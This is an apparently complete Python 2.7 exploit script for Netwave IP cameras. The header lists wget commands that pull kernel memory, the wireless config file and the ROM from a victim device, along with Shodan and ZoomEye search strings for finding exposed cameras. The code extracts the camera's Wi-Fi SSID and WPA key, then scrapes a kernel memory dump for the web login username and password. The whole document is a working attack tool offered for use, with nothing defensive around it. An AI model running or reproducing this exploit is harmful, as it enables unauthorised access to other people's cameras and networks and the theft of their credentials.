#!/usr/bin/python2.7
##
## spiritnull(at)sigaint.org
##
## Run the exploit against the victim to get WIFI password
## If the victim is vulnerable to memory leak it will try to extract the username and password for the weblogin
##
## magic for you bash:
## wget -qO- http://[HOST]:[PORT]//proc/kcore | strings
## wget -qO- http://[HOST]:[PORT]//etc/RT2870STA.dat
## wget -qO- http://[HOST]:[PORT]//dev/rom0
## wget -qO- http://[HOST]:[PORT]/get_status.cgi
##
## shodan dork:
## "Server: Netwave IP Camera"
##
## zoomeye dork:
## Netwave IP camera http config
##



import sys,os,time,tailer
import urllib2
import subprocess
import signal
from threading import Thread

try:
	if sys.argv[1] == "-h" or sys.argv[1] == "--help":
		print "Usage: python pownetwave.py [HOST]:[PORT]"
		print "Example: python pownetwave.py 127.0.0.1:81"
		sys.exit(0)

	else:
		pass
except IndexError:
	print "Usage: python pownetwave.py [HOST]:[PORT]"
	print "Example: python pownetwave.py 127.0.0.1:81"
	sys.exit(0)

def signal_handler(signal, frame):
        print('\nclearing up..')
	os.system("rm -rf tmpstream.txt")
	os.system("rm -rf tmpstrings.out")
	os.system("killall -9 wget")
	os.system("killall -9 tail")
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

macaddr = ""
done = 0
linecount = 0


class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'


print "getting system information.."+sys.argv[1]
response = urllib2.urlopen('http://'+sys.argv[1]+'/get_status.cgi')
xcontent = response.read().split(";\n")
for line in xcontent:
	if line.startswith("var id="):
		line = line.split("'")
		macaddr = line[1]
	else:
		pass


print "victims MAC-ADDRESS: "+bcolors.OKGREEN+str(macaddr)+bcolors.ENDC
print "getting wireless information.."


try:
	resp = urllib2.urlopen("http://"+sys.argv[1]+"//etc/RT2870STA.dat")
	xcontent = resp.read().split("\n")
	print "victims wireless information.."
	for line in xcontent:
		if line.startswith("WPAPSK") or line.startswith("SSID"):
			print "\t\t"+bcolors.OKGREEN+str(line)+bcolors.ENDC
		else:
			print "\t\t"+str(line)
except:
	print "wireless lan is disabled.."


print "checking for memory dump vulnerability.."


try:
	urllib2.urlopen('http://'+sys.argv[1]+'//proc/kcore')
except:
	print bcolors.FAIL+"victim isnt vulnerable for a memory leak, exiting.."+bcolors.ENDC
	sys.exit(0)


print "starting to read memory dump.. "+bcolors.WARNING+"this could take a few minutes"+bcolors.ENDC
proc = subprocess.Popen("wget -qO- http://"+sys.argv[1]+"//proc/kcore > tmpstream.txt", shell=True, preexec_fn=os.setsid)
os.system('echo "" >tmpstrings.out')
time.sleep(1)
proc2 = subprocess.Popen("tail -f tmpstream.txt | strings >>tmpstrings.out", shell=True, preexec_fn=os.setsid)
print bcolors.BOLD+"hit CTRL+C to exit.."+bcolors.ENDC


while 1:
	sys.stdout.flush()
	if os.stat('tmpstrings.out').st_size <= 1024:
		sys.stdout.write("binary data: "+str(os.stat('tmpstream.txt').st_size)+"\r")
	else:
		sys.stdout.flush()
		print "strings in binary data found.. password should be around line 10000"
		for line in tailer.follow(open('tmpstrings.out','r')):
			sys.stdout.flush()
			if done == 0:
				linecount+= 1
				if line == macaddr:
					sys.stdout.flush()
					done = 1
					print bcolors.OKGREEN+"\n\nmac address triggered.. printing the following dumps, could leak username and passwords.."+bcolors.ENDC
				else:
					sys.stdout.write(str(linecount)+"\r")
			elif done == 1:
				done = 2
				print "\nfirstline.. "+bcolors.OKGREEN+line+bcolors.ENDC
			elif done == 2:
				done = 3
				print "possible username: "+bcolors.OKGREEN+line+bcolors.ENDC
			elif done == 3:
				done = 4
				print "possible password: "+bcolors.OKGREEN+line+bcolors.ENDC
			elif done == 4:
				done = 0
				print "following line.. \n\n"+bcolors.OKGREEN+line+bcolors.ENDC
			else:
				pass


signal.pause()